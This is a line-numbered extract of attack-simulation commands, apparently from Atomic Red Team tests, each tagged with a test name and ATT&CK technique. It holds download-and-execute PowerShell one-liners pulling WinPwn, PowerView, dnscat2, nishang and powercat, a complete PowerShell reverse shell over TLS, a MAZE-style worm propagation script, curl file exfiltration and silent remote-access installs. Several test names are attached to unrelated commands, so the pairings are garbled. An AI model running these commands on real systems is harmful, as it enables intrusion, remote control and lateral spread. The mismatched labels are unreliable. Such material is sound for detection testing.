5914: [- name: WinPwn - Dotnetsearch] [attack_technique: T1518] [      /usr/libexec/PlistBuddy -c "print :CFBundleShortVersionString" /Applications/Safari.app/Contents/Info.plist]
5915: [- name: WinPwn - Dotnetsearch] [attack_technique: T1518] [      /usr/libexec/PlistBuddy -c "print :CFBundleVersion" /Applications/Safari.app/Contents/Info.plist]
5916: [- name: WinPwn - Dotnetsearch] [attack_technique: T1518] [  auto_generated_guid: 7e79a1b6-519e-433c-ad55-3ff293667101]
5917: [- name: WinPwn - Dotnetsearch] [attack_technique: T1518] [  supported_platforms:]
5918: [- name: WinPwn - Dotnetsearch] [attack_technique: T1518] [  - windows]
5919: [- name: WinPwn - Dotnetsearch] [attack_technique: T1518] [  executor:]
5920: [- name: WinPwn - Dotnetsearch] [attack_technique: T1518] [    command: |-]
5921: [- name: WinPwn - Dotnetsearch] [attack_technique: T1518] [      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t']
5922: [- name: WinPwn - Dotnetsearch] [attack_technique: T1518] [      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')]
5923: [- name: WinPwn - Dotnetsearch] [attack_technique: T1518] [      Dotnetsearch -noninteractive -consoleoutput]
5954: [- name: System Information Discovery] [attack_technique: T1082] [    command: |]
5955: [- name: System Information Discovery] [attack_technique: T1082] [      systeminfo]
5956: [- name: System Information Discovery] [attack_technique: T1082] [      reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum]
5959: [- name: Hostname Discovery (Windows)] [attack_technique: T1082] [    command: |]
5960: [- name: Hostname Discovery (Windows)] [attack_technique: T1082] [      hostname]
5963: [- name: Windows MachineGUID Discovery] [attack_technique: T1082] [    command: |]
5964: [- name: Windows MachineGUID Discovery] [attack_technique: T1082] [      REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid]
5967: [- name: Environment variables discovery on windows] [attack_technique: T1082] [    command: |]
5968: [- name: Environment variables discovery on windows] [attack_technique: T1082] [      set]
6034: [- name: Discover System Language by Registry Query] [attack_technique: T1614.001] [    command: |]
6035: [- name: Discover System Language by Registry Query] [attack_technique: T1614.001] [      reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nls\Language]
6038: [- name: Discover System Language with chcp] [attack_technique: T1614.001] [    command: |]
6039: [- name: Discover System Language with chcp] [attack_technique: T1614.001] [      chcp]
6042: [- name: System Network Configuration Discovery on Windows] [attack_technique: T1016] [    command: |]
6043: [- name: System Network Configuration Discovery on Windows] [attack_technique: T1016] [      ipconfig /all]
6044: [- name: System Network Configuration Discovery on Windows] [attack_technique: T1016] [      netsh interface show interface]
6045: [- name: System Network Configuration Discovery on Windows] [attack_technique: T1016] [      arp -a]
6046: [- name: System Network Configuration Discovery on Windows] [attack_technique: T1016] [      nbtstat -n]
6047: [- name: System Network Configuration Discovery on Windows] [attack_technique: T1016] [      net config]
6050: [- name: List Windows Firewall Rules] [attack_technique: T1016] [    command: |]
6051: [- name: List Windows Firewall Rules] [attack_technique: T1016] [      netsh advfirewall firewall show rule name=all]
6054: [- name: System Network Configuration Discovery (TrickBot Style)] [attack_technique: T1016] [    command: |]
6055: [- name: System Network Configuration Discovery (TrickBot Style)] [attack_technique: T1016] [      ipconfig /all]
6056: [- name: System Network Configuration Discovery (TrickBot Style)] [attack_technique: T1016] [      net config workstation]
6057: [- name: System Network Configuration Discovery (TrickBot Style)] [attack_technique: T1016] [      net view /all /domain]
6058: [- name: System Network Configuration Discovery (TrickBot Style)] [attack_technique: T1016] [      nltest /domain_trusts]
6061: [- name: List Open Egress Ports] [attack_technique: T1016] [    command: |]
6062: [- name: List Open Egress Ports] [attack_technique: T1016] [      $ports = Get-content #{port_file}]
6063: [- name: List Open Egress Ports] [attack_technique: T1016] [      $file = "#{output_file}"]
6064: [- name: List Open Egress Ports] [attack_technique: T1016] [      $totalopen = 0]
6065: [- name: List Open Egress Ports] [attack_technique: T1016] [      $totalports = 0]
6066: [- name: List Open Egress Ports] [attack_technique: T1016] [      New-Item $file -Force]
6067: [- name: List Open Egress Ports] [attack_technique: T1016] [      foreach ($port in $ports) {]
6068: [- name: List Open Egress Ports] [attack_technique: T1016] [          $test = new-object system.Net.Sockets.TcpClient]
6069: [- name: List Open Egress Ports] [attack_technique: T1016] [          $wait = $test.beginConnect("allports.exposed", $port, $null, $null)]
6070: [- name: List Open Egress Ports] [attack_technique: T1016] [          $wait.asyncwaithandle.waitone(250, $false) | Out-Null]
6071: [- name: List Open Egress Ports] [attack_technique: T1016] [          $totalports++ | Out-Null]
6072: [- name: List Open Egress Ports] [attack_technique: T1016] [          if ($test.Connected) {]
6073: [- name: List Open Egress Ports] [attack_technique: T1016] [              $result = "$port open" ]
6074: [- name: List Open Egress Ports] [attack_technique: T1016] [              Write-Host -ForegroundColor Green $result]
6075: [- name: List Open Egress Ports] [attack_technique: T1016] [              $result | Out-File -Encoding ASCII -append $file]
6076: [- name: List Open Egress Ports] [attack_technique: T1016] [              $totalopen++ | Out-Null]
6077: [- name: List Open Egress Ports] [attack_technique: T1016] [          }]
6078: [- name: List Open Egress Ports] [attack_technique: T1016] [          else {]
6079: [- name: List Open Egress Ports] [attack_technique: T1016] [              $result = "$port closed" ]
6080: [- name: List Open Egress Ports] [attack_technique: T1016] [              Write-Host -ForegroundColor Red $result]
6081: [- name: List Open Egress Ports] [attack_technique: T1016] [              $totalclosed++ | Out-Null]
6082: [- name: List Open Egress Ports] [attack_technique: T1016] [              $result | Out-File -Encoding ASCII -append $file]
6083: [- name: List Open Egress Ports] [attack_technique: T1016] [          }]
6084: [- name: List Open Egress Ports] [attack_technique: T1016] [      }]
6085: [- name: List Open Egress Ports] [attack_technique: T1016] [      $results = "There were a total of $totalopen open ports out of $totalports ports tested."]
6086: [- name: List Open Egress Ports] [attack_technique: T1016] [      $results | Out-File -Encoding ASCII -append $file]
6087: [- name: List Open Egress Ports] [attack_technique: T1016] [      Write-Host $results]
6092: [- name: Adfind - Enumerate Active Directory Subnet Objects] [attack_technique: T1016] [    command: |]
6093: [- name: Adfind - Enumerate Active Directory Subnet Objects] [attack_technique: T1016] [      #{adfind_path} -f (objectcategory=subnet)]
6096: [- name: Qakbot Recon] [attack_technique: T1016] [    command: |]
6097: [- name: Qakbot Recon] [attack_technique: T1016] [      #{recon_commands}]
6100: [- name: System Network Connections Discovery] [attack_technique: T1049] [    command: |]
6101: [- name: System Network Connections Discovery] [attack_technique: T1049] [      netstat]
6102: [- name: System Network Connections Discovery] [attack_technique: T1049] [      net use]
6103: [- name: System Network Connections Discovery] [attack_technique: T1049] [      net sessions]
6106: [- name: System Network Connections Discovery with PowerShell] [attack_technique: T1049] [    command: |]
6107: [- name: System Network Connections Discovery with PowerShell] [attack_technique: T1049] [      Get-NetTCPConnection]
6110: [- name: System Owner/User Discovery] [attack_technique: T1033] [    command: |]
6111: [- name: System Owner/User Discovery] [attack_technique: T1033] [      cmd.exe /C whoami]
6112: [- name: System Owner/User Discovery] [attack_technique: T1033] [      wmic useraccount get /ALL]
6113: [- name: System Owner/User Discovery] [attack_technique: T1033] [      quser /SERVER:"#{computer_name}"]
6114: [- name: System Owner/User Discovery] [attack_technique: T1033] [      quser]
6115: [- name: System Owner/User Discovery] [attack_technique: T1033] [      qwinsta.exe /server:#{computer_name}]
6116: [- name: System Owner/User Discovery] [attack_technique: T1033] [      qwinsta.exe]
6117: [- name: System Owner/User Discovery] [attack_technique: T1033] [      for /F "tokens=1,2" %i in ('qwinsta /server:#{computer_name} ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > computers.txt]
6118: [- name: System Owner/User Discovery] [attack_technique: T1033] [      @FOR /F %n in (computers.txt) DO @FOR /F "tokens=1,2" %i in ('qwinsta /server:%n ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > usernames.txt]
6121: [- name: Find computers where user has session - Stealth mode (PowerView)] [attack_technique: T1033] [    command: |]
6122: [- name: Find computers where user has session - Stealth mode (PowerView)] [attack_technique: T1033] [      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12]
6123: [- name: Find computers where user has session - Stealth mode (PowerView)] [attack_technique: T1033] [      IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose]
6126: [- name: User Discovery With Env Vars PowerShell Script] [attack_technique: T1033] [    command: |]
6127: [- name: User Discovery With Env Vars PowerShell Script] [attack_technique: T1033] [      [System.Environment]::UserName | Out-File -FilePath .\CurrentactiveUser.txt ]
6128: [- name: User Discovery With Env Vars PowerShell Script] [attack_technique: T1033] [      $env:UserName | Out-File -FilePath .\CurrentactiveUser.txt -Append]
6133: [- name: GetCurrent User with PowerShell Script] [attack_technique: T1033] [    command: |]
6134: [- name: GetCurrent User with PowerShell Script] [attack_technique: T1033] [      [System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\CurrentUserObject.txt]
6139: [- name: System Service Discovery] [attack_technique: T1007] [    command: |]
6140: [- name: System Service Discovery] [attack_technique: T1007] [      tasklist.exe]
6141: [- name: System Service Discovery] [attack_technique: T1007] [      sc query]
6142: [- name: System Service Discovery] [attack_technique: T1007] [      sc query state= all]
6145: [- name: System Service Discovery - net.exe] [attack_technique: T1007] [    command: |]
6146: [- name: System Service Discovery - net.exe] [attack_technique: T1007] [      net.exe start >> #{output_file}]
6151: [- name: System Time Discovery] [attack_technique: T1124] [    command: |]
6152: [- name: System Time Discovery] [attack_technique: T1124] [      net time \\#{computer_name}]
6153: [- name: System Time Discovery] [attack_technique: T1124] [      w32tm /tz]
6156: [- name: System Time Discovery - PowerShell] [attack_technique: T1124] [    command: |]
6157: [- name: System Time Discovery - PowerShell] [attack_technique: T1124] [      Get-Date]
6160: [- name: DNS Large Query Volume] [attack_technique: T1071.004] [    command: |]
6161: [- name: DNS Large Query Volume] [attack_technique: T1071.004] [      for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type "#{query_type}" "#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}" -QuickTimeout}]
6164: [- name: DNS Regular Beaconing] [attack_technique: T1071.004] [    command: |]
6165: [- name: DNS Regular Beaconing] [attack_technique: T1071.004] [      Set-Location PathToAtomicsFolder]
6166: [- name: DNS Regular Beaconing] [attack_technique: T1071.004] [      .\T1071.004\src\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}]
6169: [- name: DNS Long Domain Query] [attack_technique: T1071.004] [    command: |]
6170: [- name: DNS Long Domain Query] [attack_technique: T1071.004] [      Set-Location PathToAtomicsFolder]
6171: [- name: DNS Long Domain Query] [attack_technique: T1071.004] [      .\T1071.004\src\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}]
6174: [- name: DNS C2] [attack_technique: T1071.004] [    command: |]
6175: [- name: DNS C2] [attack_technique: T1071.004] [      IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')]
6176: [- name: DNS C2] [attack_technique: T1071.004] [      Start-Dnscat2 -Domain #{domain} -DNSServer #{server_ip}]
6179: [- name: OpenSSL C2] [attack_technique: T1573] [    command: |]
6180: [- name: OpenSSL C2] [attack_technique: T1573] [      $server_ip = #{server_ip}]
6181: [- name: OpenSSL C2] [attack_technique: T1573] [      $server_port = #{server_port}]
6182: [- name: OpenSSL C2] [attack_technique: T1573] [      $socket = New-Object Net.Sockets.TcpClient('#{server_ip}', '#{server_port}')]
6183: [- name: OpenSSL C2] [attack_technique: T1573] [      $stream = $socket.GetStream()]
6184: [- name: OpenSSL C2] [attack_technique: T1573] [      $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))]
6185: [- name: OpenSSL C2] [attack_technique: T1573] [      $sslStream.AuthenticateAsClient('fakedomain.example', $null, "Tls12", $false)]
6186: [- name: OpenSSL C2] [attack_technique: T1573] [      $writer = new-object System.IO.StreamWriter($sslStream)]
6187: [- name: OpenSSL C2] [attack_technique: T1573] [      $writer.Write('PS ' + (pwd).Path + '> ')]
6188: [- name: OpenSSL C2] [attack_technique: T1573] [      $writer.flush()]
6189: [- name: OpenSSL C2] [attack_technique: T1573] [      [byte[]]$bytes = 0..65535|%{0};]
6190: [- name: OpenSSL C2] [attack_technique: T1573] [      while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)]
6191: [- name: OpenSSL C2] [attack_technique: T1573] [      {$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);]
6192: [- name: OpenSSL C2] [attack_technique: T1573] [      $sendback = (iex $data | Out-String ) 2>&1;]
6193: [- name: OpenSSL C2] [attack_technique: T1573] [      $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';]
6194: [- name: OpenSSL C2] [attack_technique: T1573] [      $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);]
6195: [- name: OpenSSL C2] [attack_technique: T1573] [      $sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}]
6198: [- name: certutil download (urlcache)] [attack_technique: T1105] [    command: |]
6199: [- name: certutil download (urlcache)] [attack_technique: T1105] [      cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}]
6204: [- name: certutil download (verifyctl)] [attack_technique: T1105] [    command: |]
6205: [- name: certutil download (verifyctl)] [attack_technique: T1105] [      $datePath = "certutil-$(Get-Date -format yyyy_MM_dd)"]
6206: [- name: certutil download (verifyctl)] [attack_technique: T1105] [      New-Item -Path $datePath -ItemType Directory]
6207: [- name: certutil download (verifyctl)] [attack_technique: T1105] [      Set-Location $datePath]
6208: [- name: certutil download (verifyctl)] [attack_technique: T1105] [      certutil -verifyctl -split -f #{remote_file}]
6209: [- name: certutil download (verifyctl)] [attack_technique: T1105] [      Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach-Object { Move-Item $_.Name -Destination #{local_path} }]
6214: [- name: Windows - BITSAdmin BITS Download] [attack_technique: T1105] [    command: |]
6215: [- name: Windows - BITSAdmin BITS Download] [attack_technique: T1105] [      C:\Windows\System32\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH #{remote_file} #{local_path}]
6218: [- name: Windows - PowerShell Download] [attack_technique: T1105] [    command: |]
6219: [- name: Windows - PowerShell Download] [attack_technique: T1105] [      (New-Object System.Net.WebClient).DownloadFile("#{remote_file}", "#{destination_path}")]
6224: [- name: OSTAP Worming Activity] [attack_technique: T1105] [    command: |]
6225: [- name: OSTAP Worming Activity] [attack_technique: T1105] [      pushd #{destination_path}]
6226: [- name: OSTAP Worming Activity] [attack_technique: T1105] [      echo var fileObject = WScript.createobject("Scripting.FileSystemObject");var newfile = fileObject.CreateTextFile("AtomicTestFileT1105.js", true);newfile.WriteLine("This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives.");newfile.Close(); > AtomicTestT1105.js]
6227: [- name: OSTAP Worming Activity] [attack_technique: T1105] [      CScript.exe AtomicTestT1105.js //E:JScript]
6228: [- name: OSTAP Worming Activity] [attack_technique: T1105] [      del AtomicTestT1105.js /Q >nul 2>&1]
6229: [- name: OSTAP Worming Activity] [attack_technique: T1105] [      del AtomicTestFileT1105.js /Q >nul 2>&1]
6230: [- name: OSTAP Worming Activity] [attack_technique: T1105] [      popd]
6233: [- name: svchost writing a file to a UNC path] [attack_technique: T1105] [    command: |]
6234: [- name: svchost writing a file to a UNC path] [attack_technique: T1105] [      copy C:\Windows\System32\cmd.exe C:\svchost.exe]
6235: [- name: svchost writing a file to a UNC path] [attack_technique: T1105] [      C:\svchost.exe /c echo T1105 > \\localhost\c$\T1105.txt]
6241: [- name: Download a File with Windows Defender MpCmdRun.exe] [attack_technique: T1105] [    command: |]
6242: [- name: Download a File with Windows Defender MpCmdRun.exe] [attack_technique: T1105] [      cd "%ProgramData%\Microsoft\Windows Defender\platform\4.18*"]
6243: [- name: Download a File with Windows Defender MpCmdRun.exe] [attack_technique: T1105] [      MpCmdRun.exe -DownloadFile -url #{remote_file} -path #{local_path}]
6249: [- name: File Download via PowerShell] [attack_technique: T1105] [    command: |]
6250: [- name: File Download via PowerShell] [attack_technique: T1105] [      timeout --preserve-status #{timeout} whois -h #{remote_host} -p #{remote_port} "#{query}" > #{output_file}]
6265: [- name: File Download via PowerShell] [attack_technique: T1105] [    command: |]
6266: [- name: File Download via PowerShell] [attack_technique: T1105] [      (New-Object Net.WebClient).DownloadString('#{target_remote_file}') | Out-File #{output_file}; Invoke-Item #{output_file}]
6269: [- name: Download a file with IMEWDBLD.exe] [attack_technique: T1105] [    command: |]
6270: [- name: Download a file with IMEWDBLD.exe] [attack_technique: T1105] [      finger base64_filedata@#{remote_host}]
6271: [- name: Download a file with IMEWDBLD.exe] [attack_technique: T1105] [  auto_generated_guid: 1a02df58-09af-4064-a765-0babe1a0d1e2]
6272: [- name: Download a file with IMEWDBLD.exe] [attack_technique: T1105] [    Use IMEWDBLD.exe (built-in to windows) to download a file. This will throw an error for an invalid dictionary file.]
6273: [- name: Download a file with IMEWDBLD.exe] [attack_technique: T1105] [    Downloaded files can be found in "%LocalAppData%\Microsoft\Windows\INetCache\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>" or `%LocalAppData%\Microsoft\Windows\INetCache\IE\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>.]
6274: [- name: Download a file with IMEWDBLD.exe] [attack_technique: T1105] [    Run "Get-ChildItem -Path C:\Users\<USERNAME>\AppData\Local\Microsoft\Windows\INetCache\ -Include <FILENAME>* -Recurse -Force -File -ErrorAction SilentlyContinue" without quotes and adding the correct username and file name to locate the file.]
6275: [- name: Download a file with IMEWDBLD.exe] [attack_technique: T1105] [  supported_platforms:]
6276: [- name: Download a file with IMEWDBLD.exe] [attack_technique: T1105] [  - windows]
6277: [- name: Download a file with IMEWDBLD.exe] [attack_technique: T1105] [  input_arguments:]
6278: [- name: Download a file with IMEWDBLD.exe] [attack_technique: T1105] [    remote_url:]
6279: [- name: Download a file with IMEWDBLD.exe] [attack_technique: T1105] [      type: url]
6280: [- name: Download a file with IMEWDBLD.exe] [attack_technique: T1105] [      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml]
6281: [- name: Download a file with IMEWDBLD.exe] [attack_technique: T1105] [    file_name:]
6282: [- name: Download a file with IMEWDBLD.exe] [attack_technique: T1105] [      type: string]
6283: [- name: Download a file with IMEWDBLD.exe] [attack_technique: T1105] [      default: T1105]
6284: [- name: Download a file with IMEWDBLD.exe] [attack_technique: T1105] [  executor:]
6285: [- name: Download a file with IMEWDBLD.exe] [attack_technique: T1105] [    command: |]
6286: [- name: Download a file with IMEWDBLD.exe] [attack_technique: T1105] [      $imewdbled = $env:SystemRoot + "\System32\IME\SHARED\IMEWDBLD.exe"]
6287: [- name: Download a file with IMEWDBLD.exe] [attack_technique: T1105] [      & $imewdbled #{remote_url}]
6294: [- name: Curl Download File] [attack_technique: T1105] [    command: |]
6295: [- name: Curl Download File] [attack_technique: T1105] [      #{curl_path} -k #{file_download} -o c:\users\public\music\allthethingsx64.dll]
6296: [- name: Curl Download File] [attack_technique: T1105] [      #{curl_path} -k #{file_download} --output c:\users\public\music\allthethingsx64.dll]
6297: [- name: Curl Download File] [attack_technique: T1105] [      #{curl_path} -k #{file_download} -o c:\programdata\allthethingsx64.dll]
6298: [- name: Curl Download File] [attack_technique: T1105] [      #{curl_path} -k #{file_download} -o %Temp%\allthethingsx64.dll]
6306: [- name: Curl Upload File] [attack_technique: T1105] [    command: |]
6307: [- name: Curl Upload File] [attack_technique: T1105] [      #{curl_path} -T #{file_path} #{remote_destination}]
6308: [- name: Curl Upload File] [attack_technique: T1105] [      #{curl_path} --upload-file #{file_path} #{remote_destination}]
6309: [- name: Curl Upload File] [attack_technique: T1105] [      #{curl_path} -d #{file_path} #{remote_destination}]
6310: [- name: Curl Upload File] [attack_technique: T1105] [      #{curl_path} --data #{file_path} #{remote_destination}]
6313: [- name: Download a file with Microsoft Connection Manager Auto-Download ] [attack_technique: T1105] [    command: |]
6314: [- name: Download a file with Microsoft Connection Manager Auto-Download ] [attack_technique: T1105] [      #{Path_to_file} 1>NUL ]
6320: [- name: MAZE Propagation Script] [attack_technique: T1105] [    command: |]
6321: [- name: MAZE Propagation Script] [attack_technique: T1105] [      $machine_list = "$env:temp\T1105MachineList.txt"]
6322: [- name: MAZE Propagation Script] [attack_technique: T1105] [      $offline_list = "$env:temp\T1105OfflineHosts.txt"]
6323: [- name: MAZE Propagation Script] [attack_technique: T1105] [      $completed_list = "$env:temp\T1105CompletedHosts.txt"]
6324: [- name: MAZE Propagation Script] [attack_technique: T1105] [      foreach ($machine in get-content -path "$machine_list")]
6325: [- name: MAZE Propagation Script] [attack_technique: T1105] [      {if (test-connection -Count 1 -computername $machine -quiet) ]
6326: [- name: MAZE Propagation Script] [attack_technique: T1105] [      {cmd /c copy "#{binary_file}" "\\$machine\#{remote_drive_letter}$#{exe_remote_folder}"]
6327: [- name: MAZE Propagation Script] [attack_technique: T1105] [      echo $machine >> "$completed_list"]
6328: [- name: MAZE Propagation Script] [attack_technique: T1105] [      wmic /node: "$machine" process call create "regsvr32.exe /i #{remote_drive_letter}:#{exe_remote_folder}"}]
6329: [- name: MAZE Propagation Script] [attack_technique: T1105] [      else]
6330: [- name: MAZE Propagation Script] [attack_technique: T1105] [      {echo $machine >> "$offline_list"}}]
6340: [- name: Printer Migration Command-Line Tool UNC share folder into a zip file] [attack_technique: T1105] [    command: |]
6341: [- name: Printer Migration Command-Line Tool UNC share folder into a zip file] [attack_technique: T1105] [      del %TEMP%\PrintBrm.zip >nul 2>&1 ]
6342: [- name: Printer Migration Command-Line Tool UNC share folder into a zip file] [attack_technique: T1105] [      #{Path_PrintBrm} -b -d #{Path_unc}  -f %TEMP%\PrintBrm.zip -O FORCE]
6347: [- name: Lolbas replace.exe use to copy file] [attack_technique: T1105] [    command: |]
6348: [- name: Lolbas replace.exe use to copy file] [attack_technique: T1105] [      del %TEMP%\redcanary.cab >nul 2>&1]
6349: [- name: Lolbas replace.exe use to copy file] [attack_technique: T1105] [      #{Path_replace} #{replace_cab} %TEMP% /A]
6354: [- name: Lolbas replace.exe use to copy UNC file] [attack_technique: T1105] [    command: |]
6355: [- name: Lolbas replace.exe use to copy UNC file] [attack_technique: T1105] [      del %TEMP%\redcanary.cab >nul 2>&1]
6356: [- name: Lolbas replace.exe use to copy UNC file] [attack_technique: T1105] [      #{Path_replace} #{replace_cab} %TEMP% /A]
6361: [- name: portproxy reg key] [attack_technique: T1090.001] [    command: |]
6362: [- name: portproxy reg key] [attack_technique: T1090.001] [      networksetup -setwebproxy #{interface} #{proxy_server} #{proxy_port}]
6363: [- name: portproxy reg key] [attack_technique: T1090.001] [      networksetup -setsecurewebproxy #{interface} #{proxy_server} #{proxy_port}]
6388: [- name: Tor Proxy Usage - Windows] [attack_technique: T1090.003] [    command: |]
6389: [- name: Tor Proxy Usage - Windows] [attack_technique: T1090.003] [      PathToAtomicsFolder\T1090.003\src\Psiphon.bat]
6414: [- name: Tor Proxy Usage - Windows] [attack_technique: T1090.003] [    command: |]
6415: [- name: Tor Proxy Usage - Windows] [attack_technique: T1090.003] [     invoke-expression 'cmd /c start powershell -Command {cmd /c #{TorExe}}']
6416: [- name: Tor Proxy Usage - Windows] [attack_technique: T1090.003] [     sleep -s 60]
6417: [- name: Tor Proxy Usage - Windows] [attack_technique: T1090.003] [     stop-process -name "tor" | out-null]
6420: [- name: ICMP C2] [attack_technique: T1095] [    command: |]
6421: [- name: ICMP C2] [attack_technique: T1095] [      IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')]
6422: [- name: ICMP C2] [attack_technique: T1095] [      Invoke-PowerShellIcmp -IPAddress #{server_ip}]
6425: [- name: Netcat C2] [attack_technique: T1095] [    command: |]
6426: [- name: Netcat C2] [attack_technique: T1095] [      cmd /c #{ncat_exe} #{server_ip} #{server_port}]
6429: [- name: Powercat C2] [attack_technique: T1095] [    command: |]
6430: [- name: Powercat C2] [attack_technique: T1095] [      IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')]
6431: [- name: Powercat C2] [attack_technique: T1095] [      powercat -c #{server_ip} -p #{server_port}]
6434: [- name: Testing usage of uncommonly used port with PowerShell] [attack_technique: T1571] [    command: |]
6435: [- name: Testing usage of uncommonly used port with PowerShell] [attack_technique: T1571] [      Test-NetConnection -ComputerName #{domain} -port #{port}]
6438: [- name: DNS over HTTPS Large Query Volume] [attack_technique: T1572] [    command: |]
6439: [- name: DNS over HTTPS Large Query Volume] [attack_technique: T1572] [      for($i=0; $i -le #{query_volume}; $i++) { (Invoke-WebRequest "#{doh_server}?name=#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}&type=#{query_type}" -UseBasicParsing).Content }]
6442: [- name: DNS over HTTPS Regular Beaconing] [attack_technique: T1572] [    command: |]
6443: [- name: DNS over HTTPS Regular Beaconing] [attack_technique: T1572] [      Set-Location PathToAtomicsFolder]
6444: [- name: DNS over HTTPS Regular Beaconing] [attack_technique: T1572] [      .\T1572\src\T1572-doh-beacon.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}]
6447: [- name: DNS over HTTPS Long Domain Query] [attack_technique: T1572] [    command: |]
6448: [- name: DNS over HTTPS Long Domain Query] [attack_technique: T1572] [      Set-Location PathToAtomicsFolder]
6449: [- name: DNS over HTTPS Long Domain Query] [attack_technique: T1572] [      .\T1572\src\T1572-doh-domain-length.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}]
6452: [- name: TeamViewer Files Detected Test on Windows] [attack_technique: T1219] [    command: |]
6453: [- name: TeamViewer Files Detected Test on Windows] [attack_technique: T1219] [      Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe]
6454: [- name: TeamViewer Files Detected Test on Windows] [attack_technique: T1219] [      $file1 = "C:\Users\" + $env:username + "\Desktop\TeamViewer_Setup.exe"]
6455: [- name: TeamViewer Files Detected Test on Windows] [attack_technique: T1219] [      Start-Process -Wait $file1 /S; ]
6456: [- name: TeamViewer Files Detected Test on Windows] [attack_technique: T1219] [      Start-Process 'C:\Program Files (x86)\TeamViewer\TeamViewer.exe']
6464: [- name: AnyDesk Files Detected Test on Windows] [attack_technique: T1219] [    command: |]
6465: [- name: AnyDesk Files Detected Test on Windows] [attack_technique: T1219] [      Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe]
6466: [- name: AnyDesk Files Detected Test on Windows] [attack_technique: T1219] [      $file1 = "C:\Users\" + $env:username + "\Desktop\AnyDesk.exe"]
6467: [- name: AnyDesk Files Detected Test on Windows] [attack_technique: T1219] [      Start-Process $file1 /S;]
6473: [- name: LogMeIn Files Detected Test on Windows] [attack_technique: T1219] [    command: |]
6474: [- name: LogMeIn Files Detected Test on Windows] [attack_technique: T1219] [      Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi]
6475: [- name: LogMeIn Files Detected Test on Windows] [attack_technique: T1219] [      $file1 = "C:\Users\" + $env:username + "\Desktop\LogMeInIgnition.msi"]
6476: [- name: LogMeIn Files Detected Test on Windows] [attack_technique: T1219] [      Start-Process -Wait $file1 /quiet;]
6477: [- name: LogMeIn Files Detected Test on Windows] [attack_technique: T1219] [      Start-Process 'C:\Program Files (x86)\LogMeIn Ignition\LMIIgnition.exe' "/S"]
6484: [- name: GoToAssist Files Detected Test on Windows] [attack_technique: T1219] [    command: |]
